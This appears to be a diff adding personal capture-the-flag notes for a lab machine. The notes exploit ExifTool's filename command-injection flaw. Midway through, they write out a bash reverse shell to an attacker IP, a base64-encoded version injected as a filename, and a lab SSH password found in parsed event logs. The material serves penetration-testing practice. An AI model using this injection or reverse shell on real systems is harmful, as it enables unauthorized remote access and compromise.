@@ -1,0 +1,82 @@
+searching for php-files gives different 404 Not Found Responses
+
+========= Uploaded a JPEG and got this result ==========
+ExifTool Version Number         : 12.37
+File Name                       : testImageThree.jpeg
+Directory                       : .
+File Size                       : 5.6 KiB
+File Modification Date/Time     : 2023:02:04 03:59:03+00:00
+File Access Date/Time           : 2023:02:04 03:59:03+00:00
+File Inode Change Date/Time     : 2023:02:04 03:59:03+00:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Width                     : 265
+Image Height                    : 190
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 265x190
+Megapixels                      : 0.050
+========================================================
+
+Exiftool versions < 12.38 are vulnerable to Command Injection through a crafted filename. If the filename passed to exiftool ends with a pipe character | and exists on the filesystem, then the file will be treated as a pipe and executed as an OS command.
+
+cat /etc/passwd -> echo 'cat /etc/passwd' | base64 (converting string to b64)
+
+Y2F0IC9ldGMvcGFzc3dkCg== : echo 'Y2F0IC9ldGMvcGFzc3dkCg==' | base64 -d (decode b64)
+
+We probably are getting rce but the site cannot display the /etc/passwd most likely
+
+So we can try a simple ping to our machine and see if we get a hit using:
+	sudo tcpdump icmp -i tun0 -v
+Using burp we can capture the req after uploading an image and we changed the name to : ping 10.10.14.49 -c1| and sent it and this worked!
+
+bash -i >& /dev/tcp/10.10.14.49/4444 0>&1
+
+echos the output to bash so the command gets ran!
+echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OS80NDQ0IDA+JjEK'|base64 -d|bash|
+
+Linpeas showing something about SQLite version 3031001 -> cant find anything
+
+In /usr/local theres a strange folder
+inside investigation is a .msg that we can nc transfer and convert to a more readable format
+
+	From: Thomas Jones <thomas.jones@eforenzics.htb>
+	To: Steve Morton <steve.morton@eforenzics.htb>
+	Subject: Windows Event Logs for Analysis
+	Date: 16.09.2022 00:30:29 (+02:00)
+	Attachments: evtx-logs.zip (0 pages)
+	Hi Steve,
+	Can you look through these logs to see if our analysts have been logging on to the inspection terminal.
+	I'm concerned that they are moving data on to production without following our data transfer procedures.
+	Regards.
+	Tom
+	
+After installing extract_msg you can run it with python -m extract_msg mail.msg
+this will output a new folder in ur active dir
+
+the file it extracted was a evtx file using another tool we can convert an output to a readable xml
+
+grepping for a smorton:
+	<Data Name="KeyFilePath">C:\Users\smorton\AppData\Roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_cf950cb4-8d15-4893-9588-73ca41572166</Data>
+	<Data Name="KeyFilePath">C:\Users\smorton\AppData\Roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_cf950cb4-8d15-4893-9588-73ca41572166</Data>
+	
+grepping for KeyFilePath:
+	grep -i 'KeyFilePath' evtx.dump | sort -u
+	<Data Name="KeyFilePath">C:\ProgramData\Microsoft\Crypto\SystemKeys\8c0741ccd6dc95b4e9a6f88fa1272327_cf950cb4-8d15-4893-9588-73ca41572166</Data>
+	<Data Name="KeyFilePath">C:\Users\AAnderson\AppData\Roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_cf950cb4-8d15-4893-9588-73ca41572166</Data>
+	<Data Name="KeyFilePath">C:\Users\HMarley\AppData\Roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_cf950cb4-8d15-4893-9588-73ca41572166</Data>
+	<Data Name="KeyFilePath">C:\Users\LJenkins\AppData\Roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_cf950cb4-8d15-4893-9588-73ca41572166</Data>
+	<Data Name="KeyFilePath">C:\Users\LMonroe\AppData\Roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_cf950cb4-8d15-4893-9588-73ca41572166</Data>
+	<Data Name="KeyFilePath">C:\Users\smorton\AppData\Roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_cf950cb4-8d15-4893-9588-73ca41572166</Data>
+	
+======= THE SYSTEM KEYS GREPPING IS NOT USEFUL FOR USER PWN =========
+We can grep for target and scroll around and find 'Def@ultf0r3nz!csPa$$'
+Then attempt ssh smorton@eforenzics.htb:Def@ultf0r3nz!csPa$$
